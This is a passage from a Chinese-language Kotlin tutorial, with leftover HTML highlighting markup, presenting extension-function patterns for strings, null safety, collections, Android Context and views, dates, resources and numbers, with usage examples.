<span class="hljs-function"><span class="hljs-keyword">fun</span> String.<span class="hljs-title">removeWhitespace</span><span class="hljs-params">()</span></span>: String {
    <span class="hljs-keyword">return</span> replace(<span class="hljs-string">"\s+"</span>.toRegex(), <span class="hljs-string">""</span>)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> String.<span class="hljs-title">toSlug</span><span class="hljs-params">()</span></span>: String {
    <span class="hljs-keyword">return</span> lowercase()
        .replace(<span class="hljs-string">"\s+"</span>.toRegex(), <span class="hljs-string">"-"</span>)
        .replace(<span class="hljs-string">"[^a-z0-9-]"</span>.toRegex(), <span class="hljs-string">""</span>)
        .replace(<span class="hljs-string">"-+"</span>.toRegex(), <span class="hljs-string">"-"</span>)
        .trim(<span class="hljs-string">'-'</span>)
}

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-keyword">val</span> title = <span class="hljs-string">"This is a Long Article Title That Needs Truncation"</span>
<span class="hljs-keyword">val</span> short = title.truncate(<span class="hljs-number">20</span>) <span class="hljs-comment">// 结果: "This is a Long Ar..."</span>

<span class="hljs-keyword">val</span> name = <span class="hljs-string">"john doe"</span>
<span class="hljs-keyword">val</span> formatted = name.capitalizeWords() <span class="hljs-comment">// 结果: "John Doe"</span>

<span class="hljs-keyword">val</span> slug = <span class="hljs-string">"My Blog Post!"</span>.toSlug() <span class="hljs-comment">// 结果: "my-blog-post"</span>

</code></pre>
<hr/>
<h3 data-id="heading-4">模式 2：空安全扩展 (Null Safety Extensions)</h3>
<p><strong>问题：</strong> 代码中充斥着重复的判空检查和 Elvis 操作符（<code>?:</code>）。这是处理空值时最广泛使用的模式之一。</p>
<h4 data-id="heading-5">空安全辅助函数</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> T?.<span class="hljs-title">orDefault</span><span class="hljs-params">(default: <span class="hljs-type">T</span>)</span></span>: T {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span> ?: default
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> T?.<span class="hljs-title">orThrow</span><span class="hljs-params">(exception: () -&gt; <span class="hljs-type">Exception</span>)</span></span>: T {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span> ?: <span class="hljs-keyword">throw</span> exception()
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> T?.<span class="hljs-title">ifNull</span><span class="hljs-params">(action: () -&gt; <span class="hljs-type">Unit</span>)</span></span>: T? {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> == <span class="hljs-literal">null</span>) action()
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> T?.<span class="hljs-title">ifNotNull</span><span class="hljs-params">(action: (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Unit</span>)</span></span>: T? {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> != <span class="hljs-literal">null</span>) action(<span class="hljs-keyword">this</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>
}

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-keyword">val</span> username: String? = <span class="hljs-literal">null</span>
<span class="hljs-keyword">val</span> display = username.orDefault(<span class="hljs-string">"Guest"</span>) <span class="hljs-comment">// 结果: "Guest"</span>

<span class="hljs-keyword">val</span> userId: String? = <span class="hljs-literal">null</span>
<span class="hljs-keyword">val</span> id = userId.orThrow { IllegalArgumentException(<span class="hljs-string">"需要用户 ID"</span>) }

<span class="hljs-keyword">var</span> errorShown = <span class="hljs-literal">false</span>
<span class="hljs-keyword">val</span> result: String? = <span class="hljs-literal">null</span>
result.ifNull { errorShown = <span class="hljs-literal">true</span> }

<span class="hljs-keyword">val</span> user: User? = getUser()
user.ifNotNull { println(<span class="hljs-string">"找到用户: <span class="hljs-subst">${it.name}</span>"</span>) }
</code></pre>
<h4 data-id="heading-6">集合空安全扩展</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> List<span class="hljs-type">&lt;T&gt;</span>?.<span class="hljs-title">orEmpty</span><span class="hljs-params">()</span></span>: List&lt;T&gt; = <span class="hljs-keyword">this</span> ?: emptyList()

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;K, V&gt;</span> Map<span class="hljs-type">&lt;K, V&gt;</span>?.<span class="hljs-title">orEmpty</span><span class="hljs-params">()</span></span>: Map&lt;K, V&gt; = <span class="hljs-keyword">this</span> ?: emptyMap()

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> List<span class="hljs-type">&lt;T&gt;</span>?.<span class="hljs-title">isNullOrEmpty</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span> == <span class="hljs-literal">null</span> || isEmpty()
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> List<span class="hljs-type">&lt;T&gt;</span>?.<span class="hljs-title">isNotNullOrEmpty</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">return</span> !isNullOrEmpty()
}

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-keyword">val</span> items: List&lt;String&gt;? = <span class="hljs-literal">null</span>
items.orEmpty().forEach { println(it) } <span class="hljs-comment">// 安全遍历</span>

<span class="hljs-keyword">val</span> map: Map&lt;String, <span class="hljs-built_in">Int</span>&gt;? = <span class="hljs-literal">null</span>
<span class="hljs-keyword">val</span> count = map.orEmpty().size <span class="hljs-comment">// 结果: 0</span>

<span class="hljs-keyword">if</span> (items.isNotNullOrEmpty()) {
    <span class="hljs-comment">// 处理 items</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-7">模式 3：集合扩展 (Collection Extensions)</h3>
<p><strong>问题：</strong> 常见的集合操作往往需要编写冗长的代码。</p>
<h4 data-id="heading-8">实用集合扩展</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> List<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">second</span><span class="hljs-params">()</span></span>: T {
    <span class="hljs-keyword">if</span> (size &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">throw</span> NoSuchElementException(<span class="hljs-string">"列表元素不足 2 个"</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>[<span class="hljs-number">1</span>]
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> List<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">secondOrNull</span><span class="hljs-params">()</span></span>: T? {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (size &gt;= <span class="hljs-number">2</span>) <span class="hljs-keyword">this</span>[<span class="hljs-number">1</span>] <span class="hljs-keyword">else</span> <span class="hljs-literal">null</span>
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> List<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">takeIfNotEmpty</span><span class="hljs-params">()</span></span>: List&lt;T&gt;? {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (isNotEmpty()) <span class="hljs-keyword">this</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">null</span>
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> List<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">split</span><span class="hljs-params">(predicate: (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Boolean</span>)</span></span>: Pair&lt;List&lt;T&gt;, List&lt;T&gt;&gt; {
    <span class="hljs-keyword">return</span> partition(predicate)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> Iterable<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">sumByLong</span><span class="hljs-params">(selector: (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Long</span>)</span></span>: <span class="hljs-built_in">Long</span> {
    <span class="hljs-keyword">return</span> fold(<span class="hljs-number">0L</span>) { sum, element -&gt; sum + selector(element) }
}

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-keyword">val</span> numbers = listOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)
<span class="hljs-keyword">val</span> secondNum = numbers.secondOrNull() <span class="hljs-comment">// 结果: 2</span>

<span class="hljs-keyword">val</span> empty = emptyList&lt;String&gt;()
empty.takeIfNotEmpty() <span class="hljs-comment">// 结果: null</span>

<span class="hljs-keyword">val</span> (evens, odds) = numbers.split { it % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> }
<span class="hljs-comment">// evens = [2, 4], odds = [1, 3, 5]</span>

<span class="hljs-keyword">val</span> files = listOf(
    File(<span class="hljs-string">"file1.txt"</span>, <span class="hljs-number">100L</span>),
    File(<span class="hljs-string">"file2.txt"</span>, <span class="hljs-number">200L</span>)
)
<span class="hljs-keyword">val</span> totalSize = files.sumByLong { it.size } <span class="hljs-comment">// 结果: 300L</span>
</code></pre>
<h4 data-id="heading-9">高级集合操作</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> List<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">replaceAll</span><span class="hljs-params">(oldValue: <span class="hljs-type">T</span>, newValue: <span class="hljs-type">T</span>)</span></span>: List&lt;T&gt; {
    <span class="hljs-keyword">return</span> map { <span class="hljs-keyword">if</span> (it == oldValue) newValue <span class="hljs-keyword">else</span> it }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> List<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">chunkedBy</span><span class="hljs-params">(predicate: (<span class="hljs-type">T</span>) -&gt; <span class="hljs-type">Boolean</span>)</span></span>: List&lt;List&lt;T&gt;&gt; {
    <span class="hljs-keyword">val</span> result = mutableListOf&lt;List&lt;T&gt;&gt;()
    <span class="hljs-keyword">var</span> currentChunk = mutableListOf&lt;T&gt;()
    
    forEach { item -&gt;
        <span class="hljs-keyword">if</span> (predicate(item) &amp;&amp; currentChunk.isNotEmpty()) {
            result.add(currentChunk)
            currentChunk = mutableListOf()
        }
        currentChunk.add(item)
    }
    
    <span class="hljs-keyword">if</span> (currentChunk.isNotEmpty()) {
        result.add(currentChunk)
    }
    
    <span class="hljs-keyword">return</span> result
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;T&gt;</span> List<span class="hljs-type">&lt;T&gt;</span>.<span class="hljs-title">duplicates</span><span class="hljs-params">()</span></span>: List&lt;T&gt; {
    <span class="hljs-keyword">return</span> groupingBy { it }
        .eachCount()
        .filter { it.value &gt; <span class="hljs-number">1</span> }
        .keys
        .toList()
}

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-keyword">val</span> items = listOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>)
<span class="hljs-keyword">val</span> dups = items.duplicates() <span class="hljs-comment">// 结果: [1, 2]</span>

<span class="hljs-keyword">val</span> words = listOf(<span class="hljs-string">"hello"</span>, <span class="hljs-string">"world"</span>, <span class="hljs-string">"hello"</span>, <span class="hljs-string">"kotlin"</span>)
<span class="hljs-keyword">val</span> unique = words.replaceAll(<span class="hljs-string">"hello"</span>, <span class="hljs-string">"hi"</span>) <span class="hljs-comment">// 结果: ["hi", "world", "hi", "kotlin"]</span>
</code></pre>
<hr/>
<h3 data-id="heading-10">模式 4：Context 扩展 (Context Extensions)</h3>
<p><strong>问题：</strong> Android 中重复繁琐的 Context 相关操作。</p>
<h4 data-id="heading-11">Context 扩展函数</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> Context.<span class="hljs-title">toast</span><span class="hljs-params">(message: <span class="hljs-type">String</span>, duration: <span class="hljs-type">Int</span> = Toast.LENGTH_SHORT)</span></span> {
    Toast.makeText(<span class="hljs-keyword">this</span>, message, duration).show()
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> Context.<span class="hljs-title">showAlertDialog</span><span class="hljs-params">(
    title: <span class="hljs-type">String</span>,
    message: <span class="hljs-type">String</span>,
    positiveButton: <span class="hljs-type">String</span> = <span class="hljs-string">"确定"</span>,
    onPositive: () -&gt; <span class="hljs-type">Unit</span> = {}
)</span></span> {
    AlertDialog.Builder(<span class="hljs-keyword">this</span>)
        .setTitle(title)
        .setMessage(message)
        .setPositiveButton(positiveButton) { _, _ -&gt; onPositive() }
        .show()
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> Context.<span class="hljs-title">hideKeyboard</span><span class="hljs-params">(view: <span class="hljs-type">View</span>)</span></span> {
    <span class="hljs-keyword">val</span> imm = getSystemService(Context.INPUT_METHOD_SERVICE) <span class="hljs-keyword">as</span> InputMethodManager
    imm.hideSoftInputFromWindow(view.windowToken, <span class="hljs-number">0</span>)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> Context.<span class="hljs-title">showKeyboard</span><span class="hljs-params">(view: <span class="hljs-type">View</span>)</span></span> {
    view.requestFocus()
    <span class="hljs-keyword">val</span> imm = getSystemService(Context.INPUT_METHOD_SERVICE) <span class="hljs-keyword">as</span> InputMethodManager
    imm.showSoftInput(view, InputMethodManager.SHOW_IMPLICIT)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> Context.<span class="hljs-title">isNetworkAvailable</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">val</span> connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) <span class="hljs-keyword">as</span> ConnectivityManager
    <span class="hljs-keyword">val</span> activeNetwork = connectivityManager.activeNetworkInfo
    <span class="hljs-keyword">return</span> activeNetwork?.isConnected == <span class="hljs-literal">true</span>
}

<span class="hljs-comment">// 在 Activity/Fragment 中的用法示例</span>
toast(<span class="hljs-string">"操作成功"</span>)

showAlertDialog(
    title = <span class="hljs-string">"确认"</span>,
    message = <span class="hljs-string">"删除该项目？"</span>,
    positiveButton = <span class="hljs-string">"删除"</span>
) {
    deleteItem()
}

<span class="hljs-keyword">if</span> (isNetworkAvailable()) {
    loadData()
} <span class="hljs-keyword">else</span> {
    toast(<span class="hljs-string">"无网络连接"</span>)
}

hideKeyboard(editText)
</code></pre>
<hr/>
<h3 data-id="heading-12">模式 5：日期与时间扩展 (Date and Time Extensions)</h3>
<p><strong>问题：</strong> 复杂的日期格式化与时间计算逻辑。</p>
<h4 data-id="heading-13">日期扩展函数</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> Date.<span class="hljs-title">formatTo</span><span class="hljs-params">(pattern: <span class="hljs-type">String</span> = <span class="hljs-string">"yyyy-MM-dd"</span>)</span></span>: String {
    <span class="hljs-keyword">val</span> formatter = SimpleDateFormat(pattern, Locale.getDefault())
    <span class="hljs-keyword">return</span> formatter.format(<span class="hljs-keyword">this</span>)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> Date.<span class="hljs-title">toCalendar</span><span class="hljs-params">()</span></span>: Calendar {
    <span class="hljs-keyword">return</span> Calendar.getInstance().apply {
        time = <span class="hljs-keyword">this</span><span class="hljs-symbol">@toCalendar</span>
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> Date.<span class="hljs-title">addDays</span><span class="hljs-params">(days: <span class="hljs-type">Int</span>)</span></span>: Date {
    <span class="hljs-keyword">return</span> toCalendar().apply {
        add(Calendar.DAY_OF_MONTH, days)
    }.time
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> Date.<span class="hljs-title">addHours</span><span class="hljs-params">(hours: <span class="hljs-type">Int</span>)</span></span>: Date {
    <span class="hljs-keyword">return</span> toCalendar().apply {
        add(Calendar.HOUR_OF_DAY, hours)
    }.time
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> Date.<span class="hljs-title">isToday</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">val</span> today = Calendar.getInstance()
    <span class="hljs-keyword">val</span> dateCalendar = toCalendar()
    <span class="hljs-keyword">return</span> today.<span class="hljs-keyword">get</span>(Calendar.YEAR) == dateCalendar.<span class="hljs-keyword">get</span>(Calendar.YEAR) &amp;&amp;
           today.<span class="hljs-keyword">get</span>(Calendar.DAY_OF_YEAR) == dateCalendar.<span class="hljs-keyword">get</span>(Calendar.DAY_OF_YEAR)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> Date.<span class="hljs-title">isFuture</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">return</span> time &gt; System.currentTimeMillis()
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> Date.<span class="hljs-title">isPast</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">return</span> time &lt; System.currentTimeMillis()
}

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-keyword">val</span> now = Date()
<span class="hljs-keyword">val</span> formatted = now.formatTo(<span class="hljs-string">"MMM dd, yyyy"</span>) <span class="hljs-comment">// 结果: "Jan 08, 2026"</span>

<span class="hljs-keyword">val</span> tomorrow = now.addDays(<span class="hljs-number">1</span>)
<span class="hljs-keyword">val</span> inThreeHours = now.addHours(<span class="hljs-number">3</span>)

<span class="hljs-keyword">if</span> (deadline.isFuture()) {
    println(<span class="hljs-string">"还有时间！"</span>)
}
</code></pre>
<h4 data-id="heading-14">现代日期 API 扩展</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> LocalDateTime.<span class="hljs-title">formatTo</span><span class="hljs-params">(pattern: <span class="hljs-type">String</span> = <span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>)</span></span>: String {
    <span class="hljs-keyword">return</span> format(DateTimeFormatter.ofPattern(pattern))
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> LocalDate.<span class="hljs-title">isWeekend</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">return</span> dayOfWeek == DayOfWeek.SATURDAY || dayOfWeek == DayOfWeek.SUNDAY
}
<span class="hljs-function"><span class="hljs-keyword">fun</span> LocalDate.<span class="hljs-title">isWeekday</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">return</span> !isWeekend()
}
<span class="hljs-function"><span class="hljs-keyword">fun</span> LocalDateTime.<span class="hljs-title">toEpochMillis</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Long</span> {
    <span class="hljs-keyword">return</span> atZone(ZoneId.systemDefault()).toInstant().toEpochMilli()
}
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Long</span>.<span class="hljs-title">toLocalDateTime</span><span class="hljs-params">()</span></span>: LocalDateTime {
    <span class="hljs-keyword">return</span> LocalDateTime.ofInstant(Instant.ofEpochMilli(<span class="hljs-keyword">this</span>), ZoneId.systemDefault())
}
<span class="hljs-comment">// Usage</span>
<span class="hljs-keyword">val</span> now = LocalDateTime.now()
<span class="hljs-keyword">val</span> display = now.formatTo(<span class="hljs-string">"MMM dd, yyyy HH:mm"</span>) <span class="hljs-comment">// "Jan 08, 2026 15:30"</span>
<span class="hljs-keyword">val</span> date = LocalDate.now()
<span class="hljs-keyword">if</span> (date.isWeekend()) {
    println(<span class="hljs-string">"It's the weekend!"</span>)
}
<span class="hljs-keyword">val</span> timestamp = System.currentTimeMillis()
<span class="hljs-keyword">val</span> dateTime = timestamp.toLocalDateTime()
</code></pre>
<hr/>
<h3 data-id="heading-15">模式 6：视图扩展 (View Extensions)</h3>
<p><strong>问题：</strong> 重复的 View 操作代码。</p>
<h4 data-id="heading-16">视图显示状态扩展</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">visible</span><span class="hljs-params">()</span></span> {
    visibility = View.VISIBLE
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">invisible</span><span class="hljs-params">()</span></span> {
    visibility = View.INVISIBLE
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">gone</span><span class="hljs-params">()</span></span> {
    visibility = View.GONE
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">toggleVisibility</span><span class="hljs-params">()</span></span> {
    visibility = <span class="hljs-keyword">if</span> (visibility == View.VISIBLE) View.GONE <span class="hljs-keyword">else</span> View.VISIBLE
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">isVisible</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> = visibility == View.VISIBLE

<span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">isGone</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> = visibility == View.GONE

<span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">visibleIf</span><span class="hljs-params">(condition: <span class="hljs-type">Boolean</span>)</span></span> {
    visibility = <span class="hljs-keyword">if</span> (condition) View.VISIBLE <span class="hljs-keyword">else</span> View.GONE
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">goneIf</span><span class="hljs-params">(condition: <span class="hljs-type">Boolean</span>)</span></span> {
    visibility = <span class="hljs-keyword">if</span> (condition) View.GONE <span class="hljs-keyword">else</span> View.VISIBLE
}

<span class="hljs-comment">// 用法示例</span>
loadingSpinner.visible()
errorMessage.gone()
submitButton.visibleIf(form.isValid())
errorView.goneIf(<span class="hljs-keyword">data</span> != <span class="hljs-literal">null</span>)
</code></pre>
<h4 data-id="heading-17">视图交互扩展</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">onClick</span><span class="hljs-params">(action: () -&gt; <span class="hljs-type">Unit</span>)</span></span> {
    setOnClickListener { action() }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">onLongClick</span><span class="hljs-params">(action: () -&gt; <span class="hljs-type">Boolean</span>)</span></span> {
    setOnLongClickListener { action() }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">setMargin</span><span class="hljs-params">(left: <span class="hljs-type">Int</span> = <span class="hljs-number">0</span>, top: <span class="hljs-type">Int</span> = <span class="hljs-number">0</span>, right: <span class="hljs-type">Int</span> = <span class="hljs-number">0</span>, bottom: <span class="hljs-type">Int</span> = <span class="hljs-number">0</span>)</span></span> {
    <span class="hljs-keyword">val</span> params = layoutParams <span class="hljs-keyword">as</span>? ViewGroup.MarginLayoutParams
    params?.setMargins(left, top, right, bottom)
    layoutParams = params
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">setPadding</span><span class="hljs-params">(padding: <span class="hljs-type">Int</span>)</span></span> {
    setPadding(padding, padding, padding, padding)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">updatePadding</span><span class="hljs-params">(
    left: <span class="hljs-type">Int</span> = paddingLeft,
    top: <span class="hljs-type">Int</span> = paddingTop,
    right: <span class="hljs-type">Int</span> = paddingRight,
    bottom: <span class="hljs-type">Int</span> = paddingBottom
)</span></span> {
    setPadding(left, top, right, bottom)
}

<span class="hljs-comment">// 用法示例</span>
button.onClick {
    performAction()
}

imageView.onLongClick {
    showContextMenu()
    <span class="hljs-literal">true</span>
}

<span class="hljs-comment">// 仅设置左右边距，无需关心其他方向</span>
view.setMargin(left = <span class="hljs-number">16</span>, right = <span class="hljs-number">16</span>)

<span class="hljs-comment">// 一键设置全方向内边距</span>
view.setPadding(<span class="hljs-number">24</span>)
</code></pre>
<hr/>
<h3 data-id="heading-18">模式 7：资源访问扩展 (Resource Extensions)</h3>
<p><strong>问题：</strong> 资源访问代码过于冗长。</p>
<h4 data-id="heading-19">资源访问扩展函数</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> Context.<span class="hljs-title">drawable</span><span class="hljs-params">(<span class="hljs-meta">@DrawableRes</span> id: <span class="hljs-type">Int</span>)</span></span>: Drawable? {
    <span class="hljs-keyword">return</span> ContextCompat.getDrawable(<span class="hljs-keyword">this</span>, id)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> Context.<span class="hljs-title">color</span><span class="hljs-params">(<span class="hljs-meta">@ColorRes</span> id: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Int</span> {
    <span class="hljs-keyword">return</span> ContextCompat.getColor(<span class="hljs-keyword">this</span>, id)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> Context.<span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-meta">@StringRes</span> id: <span class="hljs-type">Int</span>, <span class="hljs-keyword">vararg</span> args: <span class="hljs-type">Any</span>)</span></span>: String {
    <span class="hljs-keyword">return</span> getString(id, *args)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> Context.<span class="hljs-title">dimension</span><span class="hljs-params">(<span class="hljs-meta">@DimenRes</span> id: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Float</span> {
    <span class="hljs-keyword">return</span> resources.getDimension(id)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> Context.<span class="hljs-title">dimensionPixelSize</span><span class="hljs-params">(<span class="hljs-meta">@DimenRes</span> id: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Int</span> {
    <span class="hljs-keyword">return</span> resources.getDimensionPixelSize(id)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">drawable</span><span class="hljs-params">(<span class="hljs-meta">@DrawableRes</span> id: <span class="hljs-type">Int</span>)</span></span>: Drawable? {
    <span class="hljs-keyword">return</span> context.drawable(id)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">color</span><span class="hljs-params">(<span class="hljs-meta">@ColorRes</span> id: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Int</span> {
    <span class="hljs-keyword">return</span> context.color(id)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">string</span><span class="hljs-params">(<span class="hljs-meta">@StringRes</span> id: <span class="hljs-type">Int</span>, <span class="hljs-keyword">vararg</span> args: <span class="hljs-type">Any</span>)</span></span>: String {
    <span class="hljs-keyword">return</span> context.string(id, *args)
}

<span class="hljs-comment">// 用法示例</span>
<span class="hljs-keyword">val</span> icon = drawable(R.drawable.ic_star)
<span class="hljs-keyword">val</span> primaryColor = color(R.color.primary)
<span class="hljs-keyword">val</span> message = string(R.string.welcome_message, userName)
<span class="hljs-keyword">val</span> spacing = dimensionPixelSize(R.dimen.spacing_medium)

<span class="hljs-comment">// 在 View 中使用</span>
imageView.setImageDrawable(drawable(R.drawable.ic_profile))
textView.setTextColor(color(R.color.text_primary))
</code></pre>
<hr/>
<h3 data-id="heading-20">模式 8：数值扩展 (Number Extensions)</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Int</span>.<span class="hljs-title">formatWithCommas</span><span class="hljs-params">()</span></span>: String {
    <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%,d"</span>, <span class="hljs-keyword">this</span>)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Double</span>.<span class="hljs-title">formatAsPrice</span><span class="hljs-params">(currencySymbol: <span class="hljs-type">String</span> = <span class="hljs-string">"$"</span>)</span></span>: String {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"<span class="hljs-variable">$currencySymbol</span>%.2f"</span>.format(<span class="hljs-keyword">this</span>)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Float</span>.<span class="hljs-title">roundTo</span><span class="hljs-params">(decimals: <span class="hljs-type">Int</span>)</span></span>: <span class="hljs-built_in">Float</span> {
    <span class="hljs-keyword">val</span> multiplier = <span class="hljs-number">10.0</span>.pow(decimals)
    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">this</span> * multiplier).roundToInt() / multiplier.toFloat()
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Int</span>.<span class="hljs-title">toBoolean</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> = <span class="hljs-keyword">this</span> != <span class="hljs-number">0</span>

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-built_in">Boolean</span>.<span class="hljs-title">toInt</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Int</span> = <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>) <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>

